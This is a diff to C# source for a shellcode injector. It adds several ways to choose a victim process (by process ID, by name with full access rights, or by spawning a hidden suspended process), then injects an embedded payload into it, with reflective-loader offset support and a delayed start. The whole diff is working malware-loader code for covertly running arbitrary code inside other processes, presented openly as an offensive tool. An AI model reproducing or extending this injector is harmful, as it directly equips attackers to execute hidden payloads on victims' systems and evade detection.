@@ -9,6 +9,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using WinAPI;
 using WinAPI.Wrapper;
+using WinAPI.Data.Kernel32;
 
 namespace EntryPoint
 {
@@ -17,95 +18,136 @@ namespace EntryPoint
 
         public static void Start()
         {
-#if DEBUG
-            Console.WriteLine("Running Inject.");
-#endif
+            Log("Running Inject.");
             ProcessCreationResult procResult = null;
-
-            //var apitype = APIAccessType.PInvoke;
-            //var injectMethod = InjectionMethod.CreateRemoteThread;
-
-            //var apitype = APIAccessType.DInvoke;
-            //var injectMethod = InjectionMethod.ProcessHollowingWithAPC;
-            //File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} RunningInjector{Environment.NewLine}");
+            IntPtr hProcess = IntPtr.Zero;
+            IntPtr hThread = IntPtr.Zero;
 
             try
             {
-                var app = Inject.Properties.Resources.Host;
-                //app = @"c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe";
-                //app = @"c:\windows\system32\dllhost.exe";
-
-                Thread.Sleep(1000);
-#if DEBUG
-                Console.WriteLine("Creating Process !");
-                Console.WriteLine(app);
-                Console.WriteLine("version 3.0");
-
-                //File.AppendAllText(@"c:\users\public\log.txt",$"{DateTime.Now} RunningInjector{Environment.NewLine}");
-#endif
-
-                //File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} Creating Process !{Environment.NewLine}");
-                //File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} {app}{Environment.NewLine}");
-                //File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} version 2.3{Environment.NewLine}");
-
+                string procIdStr = Inject.Properties.Resources.ProcessId;
+                string procName = Inject.Properties.Resources.ProcessName;
+                string procSpawn = Inject.Properties.Resources.ProcessSpawn;
+                string reflectiveFunctionName = Inject.Properties.Resources.Function;
                 int delay = 60;
                 int.TryParse(Inject.Properties.Resources.Delay, out delay);
 
-                Thread.Sleep(delay * 1000);
+                Log($"ProcessId: {procIdStr}");
+                Log($"ProcessName: {procName}");
+                Log($"ProcessSpawn: {procSpawn}");
+                Log($"ReflectiveFunction: {reflectiveFunctionName}");
+                Log($"Delay: {delay}");
 
+                int targetPid = 0;
 
-
-                var creationParms = new ProcessCreationParameters()
+                // 1. ProcessId
+                if (!string.IsNullOrEmpty(procIdStr) && int.TryParse(procIdStr, out int pid))
                 {
-                    Application = app,
-                    CreateNoWindow = true,
-                    CreateSuspended = true,
-                };
+                    Log($"[>] Targeting ProcessId: {pid}");
+                    targetPid = pid;
+                    hProcess = APIWrapper.OpenProcess(targetPid, ProcessAccessFlags.PROCESS_ALL_ACCESS);
+                    Log($"[>] Found ProcessId: {targetPid}");
+                }
+                // 2. ProcessName
+                else if (!string.IsNullOrEmpty(procName))
+                {
+                    Log($"[>] Targeting ProcessName: {procName}");
+                    var processes = APIWrapper.GetProcessList(procName);
+                    var proc = processes.FirstOrDefault();
+                    if (proc != null)
+                    {
+                        targetPid = (int)proc.ProcessId;
+                        Log($"[>] Found ProcessId: {targetPid}");
+                        hProcess = APIWrapper.OpenProcess(targetPid, ProcessAccessFlags.PROCESS_ALL_ACCESS);
+                    }
+                }
+                // 3. ProcessSpawn
+                else if (!string.IsNullOrEmpty(procSpawn))
+                {
+                    if (delay > 0)
+                    {
+                        Log($"[>] Waiting Delay: {delay}s");
+                        Thread.Sleep(delay * 1000);
+                    }
 
-#if DEBUG
-                Console.WriteLine($"[>] Executing {app}...");
-#endif
-                procResult = APIWrapper.CreateProcess(creationParms);
+                    Log($"[>] Spawning Process: {procSpawn}");
+                    var creationParms = new ProcessCreationParameters()
+                    {
+                        Application = procSpawn,
+                        CreateNoWindow = true,
+                        CreateSuspended = true,
+                    };
 
-#if DEBUG
-                Console.WriteLine($"[?] ProcessId = {procResult.ProcessId}");
-                Console.WriteLine($"[?] ProcessHandle = {procResult.ProcessHandle}");
-                Console.WriteLine($"[?] PipeHandle = {procResult.OutPipeHandle}");
-#endif
+                    procResult = APIWrapper.CreateProcess(creationParms);
+                    if (procResult != null)
+                    {
+                        hProcess = procResult.ProcessHandle;
+                        hThread = procResult.ThreadHandle;
+                    }
+                }
+                else
+                {
+                    Log("[!] No valid target specified (ProcessId, ProcessName, or ProcessSpawn). Exiting.");
+                    return;
+                }
 
-                byte[] shellcode = Inject.Properties.Resources.Payload;
-
-                APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode);
+                if (hProcess != IntPtr.Zero)
+                {
+                    Log($"[>] Injecting Target Process");
+                    byte[] shellcode = Inject.Properties.Resources.Payload;
+                    uint shellCodeOffset = string.IsNullOrEmpty(reflectiveFunctionName) ? 0 : WinAPI.Helper.ReflectiveLoaderHelper.GetReflectiveFunctionOffset(shellcode, reflectiveFunctionName);
+                    Log($"[>] shellCodeLenght : {shellcode.Length} - functionOffset {shellCodeOffset}");
+                    APIWrapper.Inject(hProcess, hThread, shellcode, shellCodeOffset);
+                }
+                else
+                {
+                    Log("[!] Failed to get handle to process.");
+                }
             }
             catch (Exception e)
             {
-#if DEBUG
-                Console.WriteLine(e.ToString());
-#endif
-                if (procResult != null)
-                    APIWrapper.KillProcess(procResult.ProcessId);
-
-                //File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} : Error => {e.ToString()}{Environment.NewLine}");
+                Log(e.ToString());
+                if (procResult != null && procResult.ProcessId != 0)
+                {
+                     // Only kill if we spawned it and failed
+                     APIWrapper.KillProcess(procResult.ProcessId);
+                }
             }
             finally
             {
                 if (procResult != null)
                 {
-                    APIWrapper.CloseHandle(procResult.ProcessHandle);
-                    APIWrapper.CloseHandle(procResult.ThreadHandle);
-                    APIWrapper.CloseHandle(procResult.OutPipeHandle);
+                     // If we spawned it, handles are in procResult
+                     APIWrapper.CloseHandle(procResult.ProcessHandle);
+                     APIWrapper.CloseHandle(procResult.ThreadHandle);
+                     APIWrapper.CloseHandle(procResult.OutPipeHandle);
                 }
-
-                //Native.Kernel32.VirtualFreeEx(process.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
+                else
+                {
+                    // If we opened existing process, close local handles
+                    if (hProcess != IntPtr.Zero) APIWrapper.CloseHandle(hProcess);
+                    // hThread is likely Zero for existing process, but if used, close it
+                    if (hThread != IntPtr.Zero) APIWrapper.CloseHandle(hThread);
+                }
             }
 
 
             Thread.Sleep(1000);
 
+            Log("End Injects !");
+
+            Environment.Exit(0);
+        }
+
+        private static void Log(string msg)
+        {
 #if DEBUG
-            Console.WriteLine("End Injects !");
-            Console.WriteLine("Plz key!");
-            Console.ReadKey();
+            try
+            {
+                Console.WriteLine(msg);
+                File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} : {msg}{Environment.NewLine}");
+            }
+            catch { }
 #endif
         }
     }
